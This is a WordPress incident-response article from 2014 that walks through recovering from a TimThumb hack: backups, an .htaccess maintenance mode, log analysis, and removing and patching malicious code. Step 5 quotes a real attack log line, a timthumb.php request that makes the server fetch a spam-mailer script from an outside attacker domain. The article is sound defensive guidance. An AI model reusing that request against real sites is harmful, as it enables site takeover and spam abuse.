---
title: Are You Prepared Against A Russian Hack?
slug: are-you-prepared-against-a-hack
image: 'https://archive.smashing.media/assets/344dbf88-fdf9-42bb-adb4-46f01eedd629/833cfad8-595a-4dbc-87b2-0552b44e253e/hacking.jpg'
date: 2014-05-30T21:30:03.000Z
author: daniel-kanchev
description: >-
  “Danger: malware ahead!” and “This website may harm your computer” are the two
  sentences that I hate most and that I don’t want any of my clients to see when
  they open their website. If you have seen any of them on your own website,
  then I’ll bet you still remember your panic attack and how you struggled to
  get your website up and running ASAP.
categories:
  - WordPress
  - Security
  - Techniques (WP)
---
“Danger: malware ahead!” and “This website may harm your computer” are the two sentences that I hate most and that I don’t want any of my clients to see when they open their website. If you have seen any of them on your own website, then I’ll bet you still remember your panic attack and how you struggled to get your website up and running ASAP.

Many great articles show how to prevent a website from being hacked. Unfortunately, unless you take it offline, your website is not and will never be completely unhackable. Don’t get me wrong, you still need to take preventive measures and regularly improve your website’s security; however, responding accordingly if your website does get hacked is equally important. In this article, we’ll provide <strong>a simple seven-step disaster-recovery plan for WordPress</strong>, which you can follow in case of an emergency. We’ll illustrate it with a real hack and specific commands that you can use when analyzing and cleaning the website.</p>

### <span class="rh">Further Reading</span> on SmashingMag:

*   [Common WordPress Malware Infections](https://www.smashingmagazine.com/2012/10/four-malware-infections-wordpress/)
*   [Hardware Hacking With JavaScript](https://www.smashingmagazine.com/2016/02/hardware-hacking-with-javascript-internet-of-things/)
*   [Increasing Innovation with Hack Nights](https://www.smashingmagazine.com/2010/07/hack-nights/)
*   [Designers, “Hacks” and Professionalism: Are We Our Own Worst Enemy?](https://www.smashingmagazine.com/2010/08/designers-hacks-and-professionalism-are-we-our-own-worst-enemy/)

## Evaluate Your Assets

The first thing to figure out is which parts of your website are important and <strong>how crucial they are to your business’ success</strong>. This is called an assets evaluation. You might say that your entire website is important, but that would just be thinking of “important” generically. You have to think of your WordPress website as a group of components that work together to serve a single purpose, and some of which are more critical than others. The weight you allocate to a particular component will determine to a large extent your course of action in an emergency.

{{% feature-panel %}}

Let’s say you have an online shop built on WooCommerce, with a custom theme and a few extra plugins, including a contact form that is not very popular among your visitors and a gallery where you rarely upload pictures. You mainly generate profit from the WooCommerce cart because your business is to sell products online.

Imagine now that the WooCommerce plugin has a vulnerability and gets hacked. You have asked your hosting provider to clean the malware and fix the problem. They tell you that the WooCommerce plugin has been compromised and that they will update it, and they ask you if they may delete and restore the website from a backup, meaning that you will lose the last 24 hours of data? Most certainly, you will say no to the restore because you cannot afford that kind of a loss. You would want them to clean the website without losing any data.

However, if you know that only your gallery has been hacked, where your last upload was one month ago or where you post pictures that are unimportant to your revenue, then you would tell them to go ahead and restore the gallery from a backup — or even delete the gallery if that’s the fastest way to get the website up and running safely again.</p>

## Identify Who Can Help You

Once you are able to clearly identify the assets that are important for you, outline <strong>whom to contact for assistance if needed</strong>. While we’ll provide details in this article on how to handle the rather technical parts of the recovery plan, no one really expects you to do any of that stuff. You will be good to go if you simply know how to respond and whom to ask for assistance.

*   **Your Web hosting provider**.  Most WordPress Web hosts offer some kind of security-related support. In many cases, they will be the first ones to let you know you’ve been hacked and to help with some diagnostics. They also might provide additional services, such as website backups, log analysis, automatic WordPress upgrades, plugin upgrades, regular security audits, malicious code cleaning, early malware notifications and website backup restoration. Research how many of these services your host provides, so that you know when to ask the host for assistance and not lose time in meaningless back-and-forth communication.
*   **Your theme’s and plugins’ developers** If you’re using a theme and plugins provided by third parties, always make sure that the developer will be able to provide support in case the theme or plugin is hacked. Always choose trusted developers because they will be ready to patch vulnerabilities in their product and help you implement the patch.</p>

## A KISS Disaster Recovery Plan

As stated, your website will never become unhackable. To be prepared for the worst, you’ll need a disaster recovery plan that restores the website to its normal working state as quickly as possible. <strong>KISS (keep it short and simple)</strong>. It doesn’t need to be complex, and you just need to list a few steps to follow in an emergency.

I’ll lay out my preferred recovery plan, illustrating each step with a real example: the WordPress TimThumb hack, which affected over 230 themes, over 30 plugins and more than 39 million Web pages as of early August 2011. I’ll assume we’re dealing with a hacked WooCommerce website, hosted on a platform with the following very popular hosting software: CentOS Linux version 6.5, cPanel/WHM control panel, Apache Web server, MySQL database server/PHP 5.3.x.</p>

### 1. Don’t Panic!

Usually, a WordPress user learns that their website has been hacked from Google, by opening the website and seeing a defaced index page, or because their hosting provider has blocked public access to the website. However you find out, the most important thing is not to panic and to follow the plan below.

Let’s assume that you tried to open the website but saw an error message, denying you access to the website. You most probably contacted your host, which told you that the website was used to send unsolicited email and that, since you didn’t do it, it was most probably hacked. So, now you know: You’ve been hacked, and no matter how scary that is, keep calm.</p>

### 2. Copy The Hacked Website And All Access Log Files

This step is mandatory. Don’t ever skip it. You need a backup of the hacked website and all access log files in order to analyze the malicious code and find out how the hackers managed to access your website’s files and/or database.

<strong>Tip:</strong> You could use a tool to back up the website, but the fastest way is to access your website via SSH and use the following commands to create the backup:

<pre><code class="language-bash">
mysqldump -uUSER -pPASSWORD DB_NAME &gt; your-site-folder/DB_NAME.sql
tar zcvf backup.tar.gz your-site-folder
</code></pre>

In our case, you’ll need to back up on a server that has cPanel. So, you have two options.

<strong>Manually back up the website</strong>

To back up your MySQL database, use the following command:

<pre><code class="language-bash">
mysqldump -uUSER -pPASSWORD DB_NAME &gt; /home/USER/DB_NAME.sql
</code></pre>

Use this next command to fully back up the SQL dump and the folder that stores your website’s files:

<pre><code class="language-bash">
tar zcvf backup_hacked.tar.gz /home/USER/DB_NAME.sql /home/USER/public_html
</code></pre>

The file <code>backup_hacked.tar.gz</code> will be created and stored in your account’s home folder. If you’re on a cPanel CentOS server, also back up the following log files:

*   `/var/log/messages` This is the FTP log file for most systems that use Pure-FTPd.
*   `/usr/local/apache/domlogs/YOURDOMAIN.COM` This is the Apache access log.
*   `/var/log/exim_mainlog` This is the Exim mail-server log file.
*   `/usr/local/cpanel/logs/access_log` This is the cPanel file manager log file.
*   `/var/log/secure` This is the log file for SSH connections.

<strong>Use cPanel to fully back up your entire hosting account</strong>

This functionality is accessible from your cPanel by going to the “Create Backup” icon. A full cPanel backup should also include the Apache access logs. Manually copy the rest of the log files and add them to the archive file.</p>

### 3. Quarantine The Website

From the moment you have backed up till the moment the vulnerability is patched, your website should be in maintenance mode to prevent further data loss and hacks. Take it out of quarantine once you are sure that the vulnerabilities have been patched.

Going into maintenance mode properly is critical, so that your search engine rankings are not affected. Search engines constantly verify that pages still exist and haven’t changed. They check for two things when they open your website:

*   your Web server’s HTTP status response code,
*   the pages themselves and the content served to visitors.

HTTP status codes provide information about the requested page(s). An HTTP status code of 200 means that the page has been successfully found by the Web server, which then delivers it to the visitor. This is the only correct status code for content. There are other status codes for redirects: 301 (permanent redirect), 302 and 307 (temporary redirect). The status code for a website in maintenance mode is 503, which tells search engines that the website is temporary unavailable. You can send this status code in combination with a particular HTTP header (<code>Retry-After</code>) to tell search engines to re-access the website after a set period of time.

<strong>Tip</strong>: Start by creating a nice HTML maintenance page to use during the quarantine. Don’t wait to be hacked before creating the maintenance page. Save the HTML page on your account or on another server so that you can use it without wasting time.

Putting your WordPress website in maintenance mode can be done in one of two ways.

<strong>Enable maintenance mode</strong>

Maintenance mode is built into WordPress. To enable it, create a file named <code>.maintenance</code> in your website’s root folder. Add the following PHP code to the file:

<pre><code class="language-php">&lt;? $upgrading = time(); ?&gt;</code></pre>

This PHP code will make WordPress show the maintenance page until you delete the <code>.maintenance</code> file. You could also <a>create a custom maintenance page</a>.

<strong>Important</strong>: This method only redirects requests to your WordPress files. If an attacker has managed to upload a PHP file manager or a shell script, then that malicious file would still be accessible via a Web browser.

<strong>Use Apache <code>mod_rewrite</code> to redirect all requests to a custom HTML maintenance page</strong>

This solution is better because you’ll be redirecting all requests, not just visitors who try to access the WordPress website directly.

To do this, name your custom HTML maintenance page <code>maintenance.html</code> and upload it to your website’s root folder. You can use the following HTML code:

<pre><code class="language-markup">
&lt;title&gt;Down For Maintenance&lt;/title&gt;

&lt;style type="text/css" media="screen"&gt;
	h1 { font-size: 50px; }
	body { text-align:center; font: 20px Helvetica, sans-serif; color: #333; }
&lt;/style&gt;

&lt;h1&gt;Down For Maintenance&lt;/h1&gt;

&lt;p&gt;Sorry for the inconvenience. We’re performing maintenance at the moment.&lt;/p&gt;
&lt;p&gt;We’ll be back online shortly!&lt;/p&gt;
</code></pre>

Create an empty file named <code>maintenance.enable</code> in your website’s root folder.

Finally, add the following lines to your <code>.htaccess</code> file:

<pre><code class="language-bash">
RewriteEngine On
RewriteCond %{REMOTE_ADDR} !^123.56.89.12
RewriteCond %{DOCUMENT_ROOT}/maintenance.html -f
RewriteCond %{DOCUMENT_ROOT}/maintenance.enable -f
RewriteCond %{SCRIPT_FILENAME} !maintenance.html
RewriteRule ^.*$ /maintenance.html [R=503,L]
ErrorDocument 503 /maintenance.html
Header Set Retry-After "14400"
Header Set Cache-Control "max-age=0, no-store"
</code></pre>

Let’s break down these mod_rewrite lines:

*   `RewriteEngine On` Turn on the rewrite engine.
*   `RewriteCond %{REMOTE_ADDR} !^123.56.89.12` Don’t match your own IP address. This line is optional; use it to prevent redirection to the maintenance page for requests from your own IP.
*   `RewriteCond %{DOCUMENT_ROOT}/maintenance.html -f` Make sure that the page named `maintenance.html` exists.
*   `RewriteCond %{DOCUMENT_ROOT}/maintenance.enable -f` Make sure that the file named `maintenance.enable` exists, which enables and disables the maintenance page.
*   `RewriteCond %{SCRIPT_FILENAME} !maintenance.html` Don’t apply the redirect rule when displaying the maintenance page.
*   `RewriteRule ^.*$ /maintenance.html [R=503,L] ErrorDocument 503 /maintenance.html` This is the actual redirection to the maintenance page itself.
*   `Header Set Retry-After "14400"` Set the `Retry-After` header to `14400` (i.e. four hours).
*   `Header Set Cache-Control "max-age=0, no-store"` This prevents caching.

At this stage, we have backed up the hacked website and put the live website in maintenance mode so that visitors do not see the hacked website and attackers cannot access the website via a browser.

<strong>Note:</strong> Now is the time to reset all of the passwords for your WordPress administrator account, for cPanel and for your FTP and email accounts.</p>

### 4. Restore Website From A Clean Backup, Or Remove Malicious Code

There are two ways to clean a hacked website. The faster way is to <strong>completely delete the website and then restore it from a clean backup</strong>. This is easy to do but has two major disadvantages: You might lose some of your data, and you can’t be sure that the backups are clean. If you update your website only from time to time, then choose this method.

To make sure the backup is clean, scan it with antivirus software, although that won’t guarantee that the files are clean. The rule of thumb is to compare the files from the backup with the files from the live website. Choose several infected files from the live website and then check the same files in the backup. If they are clean, then chances are that the whole backup file is. Sometimes hacks may affect your database and not your files. In such cases you need to compare the database used by your live site and the backup of the same DB. A nice free tool that you can use is phpMyAdmin because you can easily see the data in all tables. The bad thing about it is that it cannot automatically show you the differences between the two databases and you have to manually check all of the tables. One of the popular commercial tools that you can use is <a title="https://www.red-gate.com/products/mysql/mysql-comparison-bundle/" href="https://www.red-gate.com/products/mysql/mysql-comparison-bundle/">MySQL Comparison Bundle</a>.

The second way to clean the website is to <strong>find the affected files and database tables and remove the malicious code</strong>. Depending on the hack, cleaning them could be relatively easy or extremely complicated. In either case, you’ll have to be proficient in using Bash or Perl in order to edit text files and replace certain strings, so that you can simultaneously remove malicious code from multiple files.

<strong>Tip:</strong> If you don’t feel comfortable cleaning the malware yourself, contact your host to do it for you. Most good WordPress hosting providers offer this as a paid service. If that’s not an option with your host, then look for security companies or automated services that detect and clean malware. If you opt for an automated malware service, don’t rely on it completely. Attacks and infections evolve all the time, and no software product will automatically detect every single attack and remove all possible variations of a malicious code block. After using such a tool, manually review your files and database to make sure they are clean.

Our hypothetical WooCommerce website was most probably updated pretty often, with new orders and payments coming in. So, restoring the website from a backup is not an option due to the potential loss of data. This leaves us with the option of cleaning the malware. To do that, we need to know where the malware is located.

Our attackers have sent spam mails from our hosting account. The first step is to analyze one of the spam emails and see how the hackers managed to send it. If you don’t have access to the mail logs, then ask your hosting provider to check the logs for you. We’ll need the headers of the spam email sent from your account.

To find such an email, look for your cPanel user name in the <code>/var/log/exim_mainlog</code> file. If our user name is <code>tuser</code>, we would search the log file using the Linux <code>grep</code> command:

<pre><code class="language-bash">
grep tuser /var/log/exim_mainlog
</code></pre>

Most Exim mail servers will show records related to messages that were delivered and generated by PHP scripts:

<pre><code class="language-php">
2014-04-15 12:43:09 [19963] 1Wa7O1-0005Bz-Ex H=localhost (mailserver.com) [127.0.0.1]:43395 I=[127.0.0.1]:25 Warning: Test Spam Mail  : This message was sent via script. The details are as: SCRIPT_FILENAME=/home/tuser/public_html/wp-content/themes/premiumtheme/cache/wp-mails.php PWD=/home/tuser/public_html/wp-content REMOTE_ADDR=189.100.29.167.
</code></pre>

As you can see, the log record provides many useful details:

*   `SCRIPT_FILENAME` This is the PHP script that sent the mail.
*   `REMOTE_ADDR` This is IP address that sent the email.

If we check this PHP script, we’d find that it is not a part of WordPress’ core. In addition, we can block the remote IP address that sent the message, so that it cannot access our website again. The best way to block the IP address is to add the following line to your <code>.htaccess</code> file:

<pre><code class="language-bash">
deny from 189.100.29.167
</code></pre>

This <code>wp-mails.php</code> script is obviously not a part of WordPress’ core, so we can delete it. We’ll figure out how this script was uploaded to the website later. Finding all infected files is usually hard. As we have mentioned you can compare a clean backup with the live website. To do this, use the following command:

<pre><code class="language-bash">
diff -r /path/to/hacked/site /path/to/clean/site
</code></pre>

This command will show the differences between the two folders: new files, edited scripts and new folders. The point here is to quickly identify the differences and find the malicious back-door files. The following example shows the differences between an infected <code>index.php</code> file and a clean one:

<figure><img loading="lazy" decoding="async" src="https://archive.smashing.media/assets/344dbf88-fdf9-42bb-adb4-46f01eedd629/b2e2aa2f-10cf-44a8-becf-2a11faab2c14/code-1.jpg" alt="Code snippet 1" width="500" height="239" /></figure>

As you can see, the hackers managed to add malicious code to the first line in the <code>index.php</code> script. Usually, hackers will infect many files, not just one, and will also add malicious code to existing lines of code, so that removing it is very hard. Let’s assume that our clean <code>index.php</code> file is the default WordPress <code>index.php</code>:

<figure><img loading="lazy" decoding="async" src="https://archive.smashing.media/assets/344dbf88-fdf9-42bb-adb4-46f01eedd629/0ff73013-24c9-43cd-97b7-e91d91215be0/code-4.jpg" alt="Code snippet 2" width="500" height="330" /></figure>

The hackers have modified the file and added malicious code to line 14, changing the file to the following:

<figure><img loading="lazy" decoding="async" src="https://archive.smashing.media/assets/344dbf88-fdf9-42bb-adb4-46f01eedd629/5a6c6397-8761-4daa-a369-868d419f2b84/code-2.jpg" alt="Code snippet 3" width="500" height="491" /></figure>

The hackers added the malicious code before the <code>WP_USE_THEMES</code> definition line. Use the following Linux <code>sed</code> command to remove only the malicious code and keep the legitimate WordPress code:

<figure><img loading="lazy" decoding="async" src="https://archive.smashing.media/assets/344dbf88-fdf9-42bb-adb4-46f01eedd629/52ba3b31-2671-4658-8398-fd7323f50fcd/code-3.png" alt="Code snippet 4" width="500" height="43" /></figure>

The <code>sed</code> command uses a regular expression to find only the malicious code and remove it via substitution. You can combine it with the Linux <code>find</code> command to find all infected files and remove the malicious code. Of course, be very careful not to remove legitimate code.</p>

### 5. Check Archived Logs For Records Of Attack

Cleaning your website is just the first part of the recovery. More important is to find out how the attackers managed to do this. Usually, that information is kept in the server’s access log files, including for website access, FTP, SSH, the file manager and the control panel. Different vulnerabilities are exploited in very different ways, which is why you’ll need to be familiar with the structure of all of the access logs.

<strong>Tip:</strong> Some attacks are difficult to find, and log files that are even three to six months old will need to be checked. Keep your old log records for at least three months. Not many hosts keep logs that old, so start keeping them yourself! Also, reading logs is time-consuming and painful, so consider outsourcing that to a security specialist or to your Web host, if they offer such a service.

Now that our website is clean, we need to find out how the hackers managed to upload the <code>wp-mails.php</code> file to our account. The easiest way to do this is to check all logs files and search for the <code>wp-mails.php</code> file (using the <code>grep</code> command). Upon checking the log files, we find the following record:

<pre><code class="language-bash">
189.100.29.167 - [12/Apr/2014:06:53:41 +1000] “GET /wp-content/themes/premiumtheme/timthumb.php?src=https://www.blogger.com.exl.ro/max/wp-mails.php HTTP/1.1″ 301 – “-” “Mozilla/4.0 (compatible; MSIE 6.0; MSIE 5.5; Windows NT 5.1) Opera 7.01 [en]”
</code></pre>

Upon analyzing the log record, we notice the following information:

*   `189.100.29.167` This IP address accessed the website and used the `timthumb.php` script.
*   `premiumtheme/timthumb.php` The `timthumb.php` script is a part of your premium theme.
*   `https://www.blogger.com.exl.ro/max/wp-mails.php` The `wp-mails.php` script was downloaded from the `blogger.com.exl.ro` domain name.

This log record clearly indicates that the <code>wp-mails.php</code> script was uploaded via the <code>timthumb.php</code> script, which is a part of our premium theme. Upon opening the <code>timthumb.php</code> script, we notice that it is an outdated version of the famous <a href="https://code.google.com/p/timthumb/">TimThumb</a> project.</p>

### 6. Resolve Security Vulnerability

When you find the vulnerability, you’ll have to patch it accordingly. For example, if you find that a WordPress plugin is vulnerable, you’ll have to update it, delete it or limit access to it so that attackers cannot use it. After all, you don’t want your website to be hacked again right after you’ve cleaned it.

We’ve identified the source, and now it is time to resolve it before re-enabling the website. The best option is to update the script and replace it with the latest version, which you can download from the official TimThumb website. However, this solution might not be suitable because many theme vendors modify scripts and change code blocks to meet their own requirements. Another solution would be to delete the <code>timthumb.php</code> script and then ask your theme’s provider to issue an updated version of the entire theme. If the theme provider is reliable, then they would have already patched their theme for a vulnerability of that size.

For better security, temporarily “hide” the <code>timthumb.php</code> script from remote access until you update it by using <code>.htaccess</code> rules to allow access from certain IP addresses:

<pre><code class="language-bash">
deny from all
allow from YOUR_IP
</code></pre>

Deleting the template and reinstalling it once you obtain the new version from the vendor is also wise.</p>

### 7. Unquarantine Website, And Inform Stakeholders

Before you “unquarantine” your website, change all passwords for all accounts one more time. That’s the only way to make sure that the attackers will not be able to access the website through an affected account.

To unquarantine, simply remove the maintenance page and comment out the added lines in the <code>.htaccess</code> file.

You can also create a cron job that informs you if any file gets changed or a new file is uploaded. The following simple <code>find</code> command will find all files and folders that have been modified or created in the last 60 minutes:

<pre><code class="language-bash">
find /home/tuser/public_html/ -mmin -60
</code></pre>

A similar command is often used to display new images, CSS files or JavaScript files, but you can use it to keep an eye on files that have been uploaded to or modified on your hosting account.

The last thing to do is analyze the whole situation one more time and decide whether to inform your visitors of the issue. In our case, the hackers sent some spam emails, and the important data in the MySQL database was not affected. However, in some situations you might have to inform users that a certain type of vulnerability has affected the website and then prompt them to change their password or account settings.</p>

## Conclusion

Web security is complicated. Analyzing logs is time-consuming, and an inexperienced user might need hours to find the right line in a log file. The same goes for cleaning malicious code, scanning a website, managing a database and so many other security-related tasks. If you’re not a developer or system administrator, then you’d need years to learn all of the technical details and to learn how to “unhack” a website. The good news is that you don’t have to deal with this all by yourself!

The one thing you need to do, no matter how inexperienced you are, is <strong>be aware of the problem and be ready to manage it</strong>. If you remember the following essential points, you will be able to resolve any WordPress vulnerability and clean your hacked website:

*   Know which parts of your website can be sacrificed for the greater good, and **which are critical to your business**.
*   Security consists of both technology and policy. Learn about security problems with WordPress, and develop an effective policy to monitor and respond to issues. Then, **work with others** (your Web host, security specialists, etc.) to resolve vulnerabilities as soon as possible.
*   Security is a journey, not a destination. Even if your website is secure today, it might be defaced tomorrow. **Security is an ongoing battle**, won alternately by the good guys and the bad guys. The problem can’t be solved once and for all, which is why you need a disaster recovery plan that you can use when your website is in jeopardy!

Image credit (Excerpt): <a href="https://www.flickr.com/photos/adulau/9464930917">Alexandre Dulaunoy</a>

{{< signature "al, ml" >}}

